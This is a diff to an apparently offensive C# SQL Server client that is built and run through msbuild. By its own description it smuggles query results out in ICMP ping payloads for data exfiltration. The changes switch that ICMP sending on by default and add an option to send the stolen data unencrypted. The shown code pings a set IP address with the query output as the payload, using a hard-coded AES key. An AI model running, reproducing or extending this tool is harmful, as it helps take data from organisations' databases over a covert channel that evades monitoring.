@@ -5,8 +5,9 @@
 		Description: This is a simple C# SQL Server client that can be run through msbuild. 
 		By setting the "enableicmp" to true, and setting and IP the results of each query
 		can be included in the payload of the ICMP request for the purpose of data exfiltration.
-		The payloads are encrypted, the salt/key are hard coded.  You can use the baked in decryption
-		function to restore the payload data on the receiving system.
+		The payloads are encrypted by default, the salt/key are hard coded.  You can use the baked in decryption
+		function to restore the payload data on the receiving system. You can also disable
+		encrypted payloads by setting the "enableEncryption" variable to "false".
 	    Instructions: 
 		1. 	Save this to a .xml or .csproj file.
 		2. 	In a console, navigate to the folder containing this .csproj or .xml file.
@@ -283,7 +284,7 @@
 					// Set connection string						
 					if(connString.Equals(""))
 					{
-						connString = @"Server=SQLServer\INSTANCE;Database=Master;Integrated Security=SSPI;";												
+						connString = @"Server=SQLServer\INSTANCE;Database=Master;Integrated Security=SSPI;";						
 					}
 
 					// Create new connection
@@ -349,10 +350,11 @@
 							Console.WriteLine("\nSuccessfully wrote query output to " + filePath);
 
 								// encrypt payload
-								string encrypted64 = EncryptStringAES(fileContent.ToString(),"changethis");
+								string enableEncryption = "true";
+								string encrypted64 = EncryptStringAES(fileContent.ToString(),"changethis");								
 							
 								// send results in icmp
-								string enableicmp = "false";
+								string enableicmp = "true";
 								if(enableicmp == "true")
 								{
 									// https://docs.microsoft.com/en-us/dotnet/api/system.net.networkinformation.ping?view=netframework-4.7.2
@@ -365,7 +367,10 @@
 									options.DontFragment = true;
 
 									// Create a buffer of 32 bytes of data to be transmitted.
-									string data = encrypted64;
+									string data = fileContent.ToString();
+									if(enableEncryption == "true"){									
+										data = encrypted64;
+									}
 									byte[] buffer = Encoding.ASCII.GetBytes (data);
 									int timeout = 120;
 									PingReply reply = pingSender.Send (ipaddress, timeout, buffer, options);
